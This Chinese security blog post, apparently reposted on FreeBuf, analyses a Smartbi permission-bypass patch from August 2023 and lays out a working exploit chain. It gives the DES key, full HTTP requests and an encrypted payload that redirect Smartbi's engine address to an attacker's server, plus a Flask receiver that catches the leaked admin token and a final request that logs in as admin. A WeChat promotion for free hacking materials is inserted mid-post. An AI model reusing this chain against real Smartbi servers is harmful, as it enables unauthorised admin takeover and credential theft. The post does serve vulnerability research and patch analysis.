2023年8月8日Smartbi官方又修复了一处权限绕过漏洞。该漏洞是上一个 **特定场景下设置Token回调地址漏洞**
的绕过，未经授权的攻击者可利用该漏洞，获取管理员token，完全接管管理员权限。 于是研究了下相关补丁并进行分析。

## 0x01 分析过程

阅读相关补丁，可知此次漏洞与`/smartbix/api/monitor/setAddress`有关

![image.png](https://image.3001.net/images/20230901/1693554661_64f197e5715d1f6308ee1.png!small)

是上一个漏洞的绕过，是发现了`/smartbix/api/monitor/setAddress`接口可以未授权设置`SERVICE_ADDRESS`、`ENGINE_ADDRESS`，只不过多了一步DES解密的过程(这个上次看的时候就发现了，但是由于将`c_address`、和`u_address`看成同一个了以为不能利用，只能说很多师傅都在看smartbi,只要一有新的洞，绕过很快就出来了）

![image.png](https://image.3001.net/images/20230901/1693554663_64f197e74af238fa0affd.png!small)

查看`CommonUtil.desDecode`方法，其实也只是进行`DES`解密，密钥为`isPassword`

![image.png](https://image.3001.net/images/20230901/1693554664_64f197e8ab9d46851d25a.png!small)

故只需要按照该算法进行加密恶意参数就可以设置`SERVICE_ADDRESS`、`ENGINE_ADDRESS`为伪造服务器地址，用于接收token

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

## 0x02 分析结果

### 第一步，获取之前的EngineAddress

首先通过`/smartbi/smartbix/api/monitor/engineInfo/`接口获取之前的`engineAddress`、`serviceAddress`这是因为要进行修改设置，需要提供之前的地址

![image.png](https://image.3001.net/images/20230901/1693554666_64f197ea16a72464dd38f.png!small)

    
    
    POST /smartbi/smartbix/api/monitor/engineInfo/ HTTP/1.1  
    Host: 127.0.0.1:18080  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
    Connection: close  
    Content-Length: 4  
    ​

### 第二步，设置EngineAddress为攻击者机器上的伪造http服务地址

通过`/smartbi/smartbix/api/monitor/setAddress/`接口设置`engineAddress`为fake
server地址该接口的参数需要进行`DES`加密，参数明文为

    
    
    {  
    "type": "experiment",  
    "c_address": "http://10X.0.0.1:8010",  
    "u_address": "http://10x.0.0.55:8000"  
    }

![image.png](https://image.3001.net/images/20230901/1693554667_64f197eba9f29312d1b67.png!small)

`c_address`填写上述第一步获取得到的`engineAddress`，加密得到密文,
`u_address`设置为新的`engineAddress`，可以理解为用于接收token的fake
server地址，此处设置为[http://10x.0.0.55:8000](http://10x.0.0.55:8000/)，这个是一个用flask搭建的fake
server，上面只注册了`/api/v1/configs/engine/smartbitoken`路由

    
    
    from flask import Flask,jsonify,request  
    ​  
    ​  
    app = Flask(__name__)  
    ​  
    @app.route('/api/v1/configs/engine/smartbitoken',methods=["POST"])  
    def hello():  
      print(request.json)  
      return jsonify(hi="jello")  
    ​  
    if __name__ == "__main__":  
      app.run(host="0.0.0.0",port=8000)

![image.png](https://image.3001.net/images/20230901/1693554669_64f197ed33526411c51e4.png!small)

    
    
    POST /smartbi/smartbix/api/monitor/setAddress/ HTTP/1.1  
    Host: 127.0.0.1:18080  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
    Connection: close  
    Content-Length: 208  
    ​  
    312E8684378EBDFF7E798B0BCCC45588EF682890F6F1701AF9D9416B4E357E80A1E8622D15B57E607DBBA3017ECED7C2CA66C54FD4D13B5C1F284652B5D82487F9D9416B4E357E80A1E8622D15B57E60A18C8967740045322142EE017FD0F4E9559184E27B9F8372

![image.png](https://image.3001.net/images/20230901/1693554670_64f197ee94dff0464413e.png!small)

从响应来看返回true,即修改成功

### 第三步，触发smartbi向刚刚设置的EngineAddress外发token

    
    
    POST /smartbi//smartbix/api/monitor/token/ HTTP/1.1  
    Host: 127.0.0.1:18080  
    Cache-Control: max-age=0  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
    Connection: close  
    Content-Length: 10  
    ​  
    experiment

![image.png](https://image.3001.net/images/20230901/1693554673_64f197f121c3f08db2a20.png!small)

发送相关请求后，即可在我们的fake server上面看到了携带token的请求

![image.png](https://image.3001.net/images/20230901/1693554674_64f197f2bfba103dcbf4c.png!small)

### 第四步，使用上面获取的token进行登录

    
    
    POST /smartbi//smartbix/api/monitor/login/ HTTP/1.1  
    Host: 127.0.0.1:18080  
    Upgrade-Insecure-Requests: 1  
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36  
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9  
    Accept-Encoding: gzip, deflate  
    Accept-Language: zh-CN,zh;q=0.9,en;q=0.8  
    Connection: close  
    Content-Length: 47  
    ​  
    admin_xxxxxxxxxxxxxxxxx84f50082

返回true表示登录成功，其中的cookie就是admin账户的合法凭证

 **更多网安技能的在线实操练习，[请点击这里>>﻿](https://www.hetianlab.com/)**

